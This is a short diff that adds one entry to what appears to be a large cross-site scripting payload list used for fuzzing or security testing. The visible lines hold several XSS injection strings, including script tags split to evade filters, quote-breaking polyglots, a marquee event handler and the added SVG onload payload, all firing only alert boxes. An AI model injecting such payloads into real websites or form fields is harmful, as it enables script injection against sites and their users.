@@ -1696,3 +1696,4 @@ foo<script>alert(2671)</script>
 <scr<script>ipt>alert(2672)</scr</script>ipt>
 ';alert(2674))//\';alert(2674))//";alert(2674))//\";alert(2674))//--></SCRIPT>">'><SCRIPT>alert(2674))</SCRIPT>
 <marquee onstart='javascript:alert(2675);'>=(◕_◕)=
+</span></span><svg onload="alert(2676)//“ #"="">
